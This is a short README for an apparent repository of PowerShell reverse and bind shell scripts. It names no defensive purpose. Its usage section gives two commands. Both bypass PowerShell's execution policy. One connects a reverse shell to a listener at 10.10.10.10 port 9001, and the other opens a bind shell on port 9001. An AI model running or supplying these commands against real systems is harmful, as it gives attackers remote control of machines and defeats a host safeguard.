# PowerShell-Reverse-Shells
Selection of reverse shells written in powershell

## Example Usage
If the system allows it you might be able to just execute the scripts with the required arguments, but usually you will need to bypass the execution policy, illustrated below.
```
powershell.exe -ExecutionPolicy ByPass "&.\reverse_tcp.ps1 -server 10.10.10.10 -port 9001"
powershell.exe -ExecutionPolicy ByPass "&.\bind_tcp.ps1 -port 9001"
```
